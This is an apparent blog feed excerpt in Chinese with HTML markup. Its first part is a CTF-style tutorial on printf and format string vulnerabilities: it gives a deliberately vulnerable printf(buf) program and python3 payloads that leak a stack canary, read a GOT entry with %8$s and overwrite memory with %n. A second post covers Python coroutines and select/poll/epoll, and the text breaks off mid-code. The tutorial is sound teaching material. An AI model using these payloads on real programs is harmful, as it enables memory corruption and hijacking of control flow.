class="type">float</span>*)(&amp;c);</span><br><span class="line">    <span class="type">long</span> <span class="type">long</span> e = <span class="number">0xffffffffffffffff</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;a/b:%f，a:%d\n&quot;</span>,a/b,a,b);          <span class="comment">//打印0</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;(float)a/b:%f\n&quot;</span>,((<span class="type">float</span>)a)/b);   <span class="comment">//打印1</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;(double)a/b:%lf\n&quot;</span>,((<span class="type">double</span>)a)/b);<span class="comment">//打印2</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;d:%f\n&quot;</span>,d);                       <span class="comment">//打印3</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%.*f\n&quot;</span>,<span class="number">20</span>,(<span class="type">double</span>)a/b);          <span class="comment">//打印4</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;e:%d,a:%d\n&quot;</span>,e,a);                <span class="comment">//打印5</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;a:%d,++a:%d,a++:%d\n&quot;</span>,a,++a,a++); <span class="comment">//打印6</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行的结果是</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">a/b:<span class="number">0.000000</span>，a:<span class="number">1</span></span><br><span class="line">(<span class="type">float</span>)a/b:<span class="number">1.333333</span></span><br><span class="line">(<span class="type">double</span>)a/b:<span class="number">1.333333</span></span><br><span class="line">d:<span class="number">0.000000</span></span><br><span class="line"><span class="number">1.33333333333333325932</span></span><br><span class="line">e:<span class="number">-1</span>,a:<span class="number">4</span></span><br><span class="line">a:<span class="number">6</span>,++a:<span class="number">6</span>,a++:<span class="number">4</span></span><br></pre></td></tr></table></figure><p>第一次看到这个题的时候，感觉很奇怪，<code>printf(&quot;a/b:%f，a:%d\n&quot;,a/b,a,b);</code> 。这里格式化字符串里面只有两位，为什么要传入三个参数。</p><p>所以这里我们主要关注打印0-2涉及到的知识点</p><ol><li><p>每个参数执行“默认实际参数提升”</p><ol><li>提升规则如下: float将提升到double</li><li>char、short和相应的signed、unsigned类型将提升到int</li></ol></li><li><p>printf实际上只会接受到double，int，long int等类型的参数。而从来不会实际接受到float，char，short等类型参数。</p></li></ol><p><img src="image7.png" alt=""></p><p>我们gdb调试结果来佐证一下。</p><h2 id="格式化字符串漏洞">格式化字符串漏洞</h2><p>先来看一下prinf支持的各种参数</p><ul><li><code>%d</code> 或 <code>%i</code>：整数</li><li><code>%u</code>：无符号整数</li><li><code>%f</code>：浮点数</li><li><code>%x</code>：十六进制整数（小写）</li><li><code>%X</code>：十六进制整数（大写）</li><li><code>%o</code>：八进制整数</li><li><code>%s</code>：字符串</li><li><code>%c</code>：字符</li><li><code>%p</code>：指针地址</li><li><code>%n</code>：写入的字符数</li></ul><h3 id="格式化字符串泄漏栈上内存数据">格式化字符串泄漏栈上内存数据</h3><p>这种套路，一般用%08x, %p来泄漏栈上数据。举一个leak cannary的例子。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">char</span> buf[<span class="number">50</span>];</span><br><span class="line">    <span class="keyword">if</span>(fgets(buf, <span class="keyword">sizeof</span> buf, <span class="built_in">stdin</span>) == <span class="literal">NULL</span>) <span class="keyword">return</span>;</span><br><span class="line">    <span class="built_in">printf</span>(buf);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -g -Wall -fstack-protector-all -o program_with_canary program.c</span><br></pre></td></tr></table></figure><p>Cannary会被从QWORD PTR fs:0x28放到栈上，然后我们用%p来读，一个%p读8字节的内存。</p><p><img src="image8.png" alt=""></p><p>实际需要多少个可以通过gdb或静态分析来算。这里给用14个就行了。</p><p><img src="image9.png" alt=""></p><h3 id="格式化字符串泄漏任意地址数据">格式化字符串泄漏任意地址数据</h3><p>这种套路一般用来泄漏got表数据，先构想读地址的值在栈上，然后调用%s去读这个地址。</p><p>因为这个地址需要在栈上，所以这里为方便用32位程序演示。这个值肯定和printf的第一个参数有一些偏移。所以最后我们需要用%n$s这种“加强版”的%s去读到偏移。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -g -m32 -Wall -fno-<span class="built_in">stack</span>-protector -o vulnerable_program program.c</span><br></pre></td></tr></table></figure><p>先来读一下GOT表</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">readelf -r vulnerable_program | grep fget</span><br><span class="line"><span class="number">0804</span>c010  <span class="number">00000207</span> R_386_JUMP_SLOT   <span class="number">00000000</span>   fgets@GLIBC_2<span class="number">.0</span></span><br></pre></td></tr></table></figure><p>和刚才思路类似，先用以一坨%p看一下偏移</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AAAA %p %p %p %p %p %p %p %p %p %p %p %p %p %p</span><br></pre></td></tr></table></figure><p><img src="image10.png" alt=""></p><p>这里AAAA被断开了，所以我们还需要padding一下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PPAAAA%p %p %p %p %p %p %p %p %p %p %p %p %p %p</span><br></pre></td></tr></table></figure><p><img src="image11.png" alt=""></p><p>所以我只需要用%8$s即可以读到GOT表地址</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -c <span class="string">&#x27;import sys; sys.stdout.buffer.write(b&quot;PP\x10\xc0\x04\x08%8$s\n&quot;)&#x27;</span>  </span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">b main</span><br><span class="line">run &lt; text</span><br></pre></td></tr></table></figure><p><img src="image12.png" alt=""></p><p><img src="image13.png" alt=""></p><h3 id="格式化字符串向任意地址写入数据">格式化字符串向任意地址写入数据</h3><p>这种要结合%n来利用，先来看一下%n的用法。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">int</span> i;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;AAAA%n\n&quot;</span>, &amp;i);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, i);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>printf解析到%n会把输出的字符串的长度放在i中。</p><p><img src="image14.png" alt=""></p><p>在漏洞利用中，类似于我们用\x10\xc0\x04\x08%8$s去偏移8处读\x10\xc0\x04\x08地址的值。我门用\x10\xc0\x04\x08%8$n去偏移8处的\x10\xc0\x04\x08地址写入打印出来的字符个数。这样我们只要控制打印字数就可以控制任意地址的值了。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -c <span class="string">&#x27;import sys; sys.stdout.buffer.write(b&quot;PP\x10\xc0\x04\x08%8$n\n&quot;)&#x27;</span></span><br></pre></td></tr></table></figure><p>修改前 p *0x0804c010</p><p><img src="image15.png" alt=""></p><p>修改后</p><p><img src="image16.png" alt=""></p><p>这里我们只输出六个字符，太少了。实际利用肯定要写入一个地址(比如one gadget的地址)，这个地址一般都很大比如0x80c0ffff，所以需要结合printf的对齐语法来写入大值。</p><p>假设第10个偏移是0x0804c010，那我们理论上就可以把地址0x0804c010写入0x08ffffff的值</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -c <span class="string">&#x27;import sys; sys.stdout.buffer.write(b&quot;%150994943d%12$nAA\x10\xc0\x04\x08\n&quot;)&#x27;</span> &gt; te</span><br></pre></td></tr></table></figure><p><img src="image17.png" alt=""></p><p>在输出大量padding过后成功修改完地址</p><p><img src="image18.png" alt=""></p><p>这种方法简单粗暴，但更优雅的方式是逐字节修改。</p><p>依次对0804c010写入0xff，0804c011写入0xff，0804c012写入0xff，0804c013写入0x08</p><h2 id="附-non-pie-与-ASLR">附 non pie 与 ASLR</h2><p>程序是no pie的就算操作系统开了ASLR也没用？</p><ol><li><p>ASLR（Address Space Layout Randomization）：</p><ol><li>这是一个操作系统级别的安全特性。</li><li>它随机化进程的内存布局，包括堆、栈、共享库的加载位置等。</li></ol></li><li><p>PIE（Position Independent Executable）：</p><ol><li>这是一个编译时的选项。</li><li>它使可执行文件的代码段也能被随机化。</li></ol></li><li><p>ASLR 和 no-PIE 的组合效果：</p><ol><li><p>如果程序是 no-PIE 的（非位置独立可执行文件），但操作系统开启了 ASLR：</p><ul><li>程序的代码段（.text）将会在固定的地址加载。</li><li>但是，堆、栈、共享库等仍然会被随机化。</li></ul></li></ol></li></ol><h2 id="附-python字符集的坑">附 python字符集的坑</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">parallels@parallels-Parallels-Virtual-Platform:~/Desktop$ python3 -c <span class="string">&#x27;print(&quot;PP\x10\xc0\x04\x08%7$s&quot;)&#x27;</span>  &gt; text</span><br><span class="line">parallels@parallels-Parallels-Virtual-Platform:~/Desktop$ cat text |xxd</span><br><span class="line"><span class="number">00000000</span>: <span class="number">5050</span> <span class="number">10</span>c3 <span class="number">8004</span> <span class="number">0825</span> <span class="number">3724</span> <span class="number">730</span>a            PP.....%<span class="number">7</span>$s.</span><br></pre></td></tr></table></figure><h2 id="参考">参考</h2><p><a href="https://blog.csdn.net/dreamer2020/article/details/24158303">https://blog.csdn.net/dreamer2020/article/details/24158303</a></p><p><a href="https://www.yanbinghu.com/2018/12/02/10796.html">https://www.yanbinghu.com/2018/12/02/10796.html</a></p><p><a href="https://www.cnblogs.com/jillzhang/archive/2007/06/24/793901.html">https://www.cnblogs.com/jillzhang/archive/2007/06/24/793901.html</a></p><p><a href="https://blog.csdn.net/weixin_42250302/article/details/108287860">https://blog.csdn.net/weixin_42250302/article/details/108287860</a></p><p><a href="https://www.cnblogs.com/zuoxiaolong/p/computer11.html">https://www.cnblogs.com/zuoxiaolong/p/computer11.html</a></p><p><a href="https://github.com/firmianay/CTF-All-In-One/blob/master/SUMMARY.md">https://github.com/firmianay/CTF-All-In-One/blob/master/SUMMARY.md</a></p>]]></content>
    
    
    <summary type="html">重新认识printf</summary>
    
    
    
    
    <category term="binary" scheme="https://cl0und.xyz/tags/binary/"/>
    
  </entry>
  
  <entry>
    <title>与AI纸上谈兵-Python协程的原理与I/O多路复用</title>
    <link href="https://cl0und.xyz/2024/08/21/%E4%B8%8EAI%E7%BA%B8%E4%B8%8A%E8%B0%88%E5%85%B5-Python%E5%8D%8F%E7%A8%8B%E7%9A%84%E5%8E%9F%E7%90%86%E4%B8%8EI-O%E5%A4%9A%E8%B7%AF%E5%A4%8D%E7%94%A8/"/>
    <id>https://cl0und.xyz/2024/08/21/%E4%B8%8EAI%E7%BA%B8%E4%B8%8A%E8%B0%88%E5%85%B5-Python%E5%8D%8F%E7%A8%8B%E7%9A%84%E5%8E%9F%E7%90%86%E4%B8%8EI-O%E5%A4%9A%E8%B7%AF%E5%A4%8D%E7%94%A8/</id>
    <published>2024-08-21T11:44:53.000Z</published>
    <updated>2025-01-04T03:50:30.420Z</updated>
    
    <content type="html"><![CDATA[<p>推荐一个prompt的网站 <a href="https://snackprompt.com/">https://snackprompt.com/</a> ，下面会用这里面的prompt以获取更结构化的答案。</p><!-- more --><h2 id="python协程程能做到高并发的底层原理">python协程程能做到高并发的底层原理</h2><p>使用<a href="https://snackprompt.com/prompt/get-chatgpt4-to-efficiently-teach-you-difficult-advanced-technical-concepts">Get ChatGPT4 to efficiently teach you difficult / advanced technical concepts</a> 这个prompt</p><p>Python’s concurrency, particularly through coroutines, is a powerful feature that allows high concurrency with minimal overhead. Here’s a breakdown of the underlying principles:</p><ol><li><p>Understanding Coroutines:</p><ol><li>Coroutines are generalizations of subroutines. Unlike subroutines, coroutines can pause execution and return control to the caller, enabling tasks to be executed concurrently.</li><li>This is aided by the <code>asyncio</code> library in Python, which provides a framework for writing single-threaded concurrent code using coroutines.</li></ol></li><li><p>Event Loop:</p><ol><li>At the heart of coroutine-based concurrency is the event loop. The event loop runs the registered tasks (coroutines) in an organized manner. It uses I/O multiplexing to manage tasks without the need for multiple threads or processes.</li></ol></li><li><p>Non-blocking I/O Operations:</p><ol><li>Coroutines efficiently manage I/O-bound and high-level structured network code through non-blocking operations. When a coroutine performs an I/O operation, other tasks can run. When the operation completes, the routine is resumed.</li></ol></li><li><p>Task Scheduling:</p><ol><li>Instead of creating a new thread for each task, the event loop schedules multiple tasks to run on the same thread. This lightweight task management means less overhead compared to threads and processes.</li></ol></li><li><p>Yielding Control:</p><ol><li><code>await</code> expressions in coroutines are used to yield control back to the event loop, allowing other tasks to run. This cooperative multitasking reduces the complexity of managing context switches, unlike preemptive multitasking.</li></ol></li><li><p>Memory Efficiency:</p><ol><li>Coroutines are much more memory efficient compared to threads because they do not require their own stack. They work in the same address space, avoiding the need for context switching that is typical of thread-based concurrency.</li></ol></li><li><p>Concurrency Patterns:</p><ol><li>Advanced patterns like producer-consumer, pipelines, and fan-out/fan-in can be implemented using coroutines to effectively handle high concurrency scenarios with low latency.</li></ol></li></ol><p>Understanding these principles helps you leverage Python’s concurrency through coroutines to achieve high throughput in applications with limited resources.</p><h2 id="追问-I-O不被操作系统挂起的原因">追问 I/O不被操作系统挂起的原因</h2><blockquote><p>“When a coroutine performs an I/O operation, other tasks can run. When the operation completes, the coroutine is resumed.”</p><p>假设这个包含协程的线程是A，其它线程比如一个UI的线程是B</p><p>它是怎么做到检测一个task在I/O然后切换到另一个task的，对于操作系统来说（比如linux）尽管它有很多task但是对于kernel来说就是只有一个线程。也就是说一个task在I/O的时候，内核会认为这个线程有I/O。这时候内核难道不是应该把这个包含协程的线程A挂起，切换其它的线程比如B进来执行吗？为什么会让这个协程继续执行后其他的task？</p></blockquote><p>在Python的协程模型中，特别是使用<code>asyncio</code>库时，协程的执行并不依赖于操作系统的线程调度。相反，它依赖于一个事件循环（event loop）来管理和调度任务。这意味着即使在单线程环境下，也可以通过协程实现并发。</p><h3 id="事件循环和非阻塞I-O">事件循环和非阻塞I/O</h3><ol><li>事件循环：事件循环是协程并发的核心。它负责调度和执行协程任务。当一个协程遇到<code>await</code>表达式（通常是一个I/O操作）时，它会将控制权返回给事件循环，而不是阻塞线程。</li><li>非阻塞I/O：协程中的I/O操作是非阻塞的。这意味着，当一个协程等待I/O操作完成时，它不会阻塞整个线程。相反，事件循环会继续运行其他已准备好的协程。</li></ol><h3 id="内核和线程的交互">内核和线程的交互</h3><p><strong>在操作系统层面（例如Linux），线程在执行I/O操作时会被标记为“可阻塞”状态。然而，Python的</strong>**<code>asyncio</code><strong><strong>库通过使用非阻塞I/O（例如，使用</strong></strong><code>select</code><strong><strong>、</strong></strong><code>poll</code><strong><strong>或</strong></strong><code>epoll</code>**<strong>等系统调用）来避免线程被阻塞。</strong></p><ul><li>当协程执行一个非阻塞I/O操作时，事件循环会注册这个操作，并继续执行其他任务。</li><li>一旦I/O操作完成，事件循环会收到通知，并恢复被挂起的协程。</li></ul><h3 id="协程与线程的区别">协程与线程的区别</h3><ul><li>协程：在用户级别管理，依赖于事件循环进行调度。它们共享同一个线程，不需要操作系统的上下文切换，因此开销较小。</li><li>线程：由操作系统管理，涉及到内核级别的调度和上下文切换，开销较大。</li></ul><h3 id="线程A和线程B的关系">线程A和线程B的关系</h3><p>在你的例子中，线程A运行事件循环并调度协程任务，线程B可能运行其他任务（例如UI）。如果线程A中的协程在等待I/O，事件循环会继续调度其他协程，而不会被操作系统挂起。只有当线程A没有其他协程可以运行时，操作系统才可能将线程A挂起并调度其他线程（例如线程B）。</p><p>因此，通过这种方式，Python的协程能够在单线程环境中实现高效的并发，而不需要依赖多线程机制。</p><h2 id="追问-select-poll-epoll的原理">追问 select, poll, epoll的原理</h2><p>使用 <a href="https://snackprompt.com/prompt/compscigpt-computer-science-assistant">CompSciGPT computer science assistant</a> 这个prompt</p><p>In the realm of operating systems and network programming, handling multiple simultaneous I/O operations is crucial. This is where system calls like <code>select</code>, <code>poll</code>, and <code>epoll</code> come into play, particularly in environments like server development. Let’s explore the differences and use cases for each:</p><h3 id="Select">Select</h3><ul><li><p>Overview: <code>select</code> is one of the oldest I/O multiplexing options available in Unix-based systems.</p></li><li><p>Functionality: It allows a program to monitor multiple file descriptors to see if any of them is ready for I/O (e.g., ready to read, write, or has an exceptional condition pending).</p></li><li><p>Limitations:</p><ul><li>Scalability: It supports a limited number of file descriptors, typically 1024, though this is configurable in some systems.</li><li>Performance: Every call to <code>select</code> requires the kernel to walk through the entire list of file descriptors to check their states, which can become inefficient for a large number of file descriptors.</li><li>FD_SET Management: You must reset the file descriptor set for each call.</li></ul></li></ul><h3 id="Poll">Poll</h3><ul><li><p>Overview: <code>poll</code> was introduced to overcome some of the <code>select</code> limitations.</p></li><li><p>Functionality: Similar to <code>select</code>, but it uses a different approach to handle file descriptors, allowing a greater number.</p></li><li><p>Advantages:</p><ul><li>No Hard Limit: Unlike <code>select</code>, <code>poll</code> does not have a hardcoded limit on the number of file descriptors it can monitor.</li><li>Simplified Interface: Instead of managing multiple fd sets, <code>poll</code> uses a single array of <code>pollfd</code> structures.</li></ul></li><li><p>Limitations:</p><ul><li>Performance: Though better than <code>select</code>, it still requires iterating over the entire list of file descriptors, which can be computationally expensive as the number of descriptors grows.</li></ul></li></ul><h3 id="Epoll">Epoll</h3><ul><li><p>Overview: <code>epoll</code> is specific to Linux and designed to be more efficient and scalable than both <code>select</code> and <code>poll</code>.</p></li><li><p>Functionality: It allows management of a large number of file descriptors with better performance characteristics.</p></li><li><p>Advantages:</p><ul><li>Scalability: Ideal for applications with a high number of file descriptors (thousands or more).</li><li>Efficiency: Uses a ready list instead of scanning all descriptors. The kernel tracks which file descriptors are “active,” which saves resources.</li><li>Edge/Level Triggering: Offers two modes (edge-triggered and level-triggered) giving developers finer control over the handling of ready events.</li><li>Persistent Interest: Once you register interest in certain events, <code>epoll</code> keeps the interest until explicitly changed or removed.</li></ul></li><li><p>Limitations:</p><ul><li>Complexity: Programming with <code>epoll</code> can be more complex, requiring a good understanding of its behavior, especially with edge-triggered semantics.</li></ul></li></ul><h3 id="Choosing-the-Right-System-Call">Choosing the Right System Call</h3><ul><li>Select: Rarely used in modern applications due to its limitations, but can be suitable for smaller, less demanding applications.</li><li>Poll: A reasonable choice when you need more capability than <code>select</code> offers, without needing the complexity of <code>epoll</code>.</li><li>Epoll: The preferred choice for high-performance server applications on Linux due to its scalability and efficient event notification handling.</li></ul><h3 id="Practical-Considerations">Practical Considerations</h3><ul><li>When designing networked applications, especially servers, the choice between <code>select</code>, <code>poll</code>, and <code>epoll</code> can significantly impact performance.</li><li>Understand the workload and environment specifics to make an informed decision. For example, cross-platform applications might prefer <code>poll</code> for its broader compatibility.</li><li>Always consider the trade-offs between complexity and performance. While <code>epoll</code> offers great performance, it requires careful handling of edge cases in event management.</li></ul><p>In conclusion, a solid understanding of <code>select</code>, <code>poll</code>, and <code>epoll</code> not only helps in choosing the right tool for your application needs but also aids in optimizing the application’s performance in a networked infrastructure.</p><h2 id="select-poll-epoll代码">select, poll, epoll代码</h2><p>Certainly! Let’s modify the examples to demonstrate how to use <code>select</code>, <code>poll</code>, and <code>epoll</code> for file I/O operations. Since file operations are often simpler than networking operations, these examples will assume we’re using a non-blocking read operation on a file.</p><h3 id="Common-Setup">Common Setup</h3><p>First, let’s ensure we have a file to work with:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span>  #<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span>  #<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span>  #<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span>  int setup_file(const char *filename) &#123;  </span></span><br><span class="line">    <span class="type">int</span> fd = open(filename, O_RDONLY | O_NONBLOCK);  </span><br><span class="line">    <span class="keyword">if</span> (fd == <span class="number">-1</span>) &#123;  </span><br><span class="line">        perror(<span class="string">&quot;open&quot;</span>);  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">return</span> fd;  </span><br><span class="line">&#125;  </span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">When you open a file with the O_NONBLOCK flag, </span></span><br><span class="line"><span class="comment">it specifies that subsequent operations (like read or write) on the file descriptor should be non-blocking </span></span><br><span class="line"><span class="comment">if they support non-blocking behavior. </span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><p>This <code>setup_file</code> function will open a file in non-blocking mode, which is essential for non-blocking I/O operations.</p><h3 id="Select-Example-with-File-I-O">Select Example with File I/O</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/select.h&gt;</span>  </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span>  </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span>  </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span>  </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span>  </span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;  </span><br><span class="line">    <span class="type">int</span> fd = setup_file(<span class="string">&quot;example.txt&quot;</span>);  </span><br><span class="line">    <span class="keyword">if</span> (fd == <span class="number">-1</span>) <span class="keyword">return</span> <span class="number">1</span>;  </span><br><span class="line"></span><br><span class="line">    fd_set readfds;  </span><br><span class="line">    FD_ZERO(&amp;readfds);  </span><br><span class="line">    FD_SET(fd, &amp;readfds);  </span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">timeval</span> <span class="title">tv</span>;</span>  </span><br><span class="line">    tv.tv_sec = <span class="number">5</span>;  <span class="comment">// Wait for up to 5 seconds  </span></span><br><span class="line">    tv.tv_usec = <span class="number">0</span>;  </span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> retval = select(fd + <span class="number">1</span>, &amp;readfds, <span class="literal">NULL</span>, <span class="literal">NULL</span>, &amp;tv);  </span><br><span class="line">    <span class="keyword">if</span> (retval == <span class="number">-1</span>) &#123;  </span><br><span class="line">        perror(<span class="string">&quot;select&quot;</span>);  </span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (retval) &#123;  </span><br><span class="line">        <span class="keyword">if</span> (FD_ISSET(fd, &amp;readfds)) &#123;  </span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;File is ready for reading.\n&quot;</span>);  </span><br><span class="line">            <span class="comment">// Read from the file  char buffer[1024];  </span></span><br><span class="line">            <span class="type">ssize_t</span> bytes_read = read(fd, buffer, <span class="keyword">sizeof</span>(buffer));  </span><br><span class="line">            <span class="keyword">if</span> (bytes_read &gt; <span class="number">0</span>) &#123;  </span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;Read %zd bytes: %.*s\n&quot;</span>, bytes_read, (<span class="type">int</span>)bytes_read, buffer);  </span><br><span class="line">            &#125;  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;  </span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;No data read within five seconds.\n&quot;</span>);  </span><br><span class="line">    &#125;  </span><br><span class="line"></span><br><span class="line">    close(fd);  </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;  </span><br><span class="line">&#125;  </span><br></pre></td></tr></table></figure><h3 id="Poll-Example-with-File-I-O">Poll Example with File I/O</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;poll.h&gt;</span>  </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span>  </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span>  </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span>  </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span>  </span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;  </span><br><span class="line">    <span class="type">int</span> fd = setup_file(<span class="string">&quot;example.txt&quot;</span>);  </span><br><span class="line">    <span class="keyword">if</span> (fd == <span class="number">-1</span>) <span class="keyword">return</span> <span class="number">1</span>;  </span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">pollfd</span> <span class="title">fds</span>[1];</span>  </span><br><span class="line">    fds[<span class="number">0</span>].fd = fd;  </span><br><span class="line">    fds[<span class="number">0</span>].events = POLLIN;  </span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> retval = poll(fds, <span class="number">1</span>, <span class="number">5000</span>);  <span class="comment">// Wait for 5 seconds  </span></span><br><span class="line">  </span><br><span class="line">    <span class="keyword">if</span> (retval == <span class="number">-1</span>) &#123;  </span><br><span class="line">        perror(<span class="string">&quot;poll&quot;</span>);  </span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (retval &gt; <span class="number">0</span>) &#123;  </span><br><span class="line">        <span class="keyword">if</span> (fds[<span class="number">0</span>].revents &amp; POLLIN) &#123;  </span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;File is ready for reading.\n&quot;</span>);  </span><br><span class="line">            <span class="comment">// Read from the file  char buffer[1024];  </span></span><br><span class="line">            <span class="type">ssize_t</span> bytes_read = read(fd, buffer, <span class="keyword">sizeof</span>(buffer));  </span><br><span class="line">            <span class="keyword">if</span> (bytes_read &gt; <span class="number">0</span>) &#123;  </span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;Read %zd bytes: %.*s\n&quot;</span>, bytes_read, (<span class="type">int</span>)bytes_read, buffer);  </span><br><span class="line">            &#125;  </span><br><span class="line">        &#125;  </span><br><span 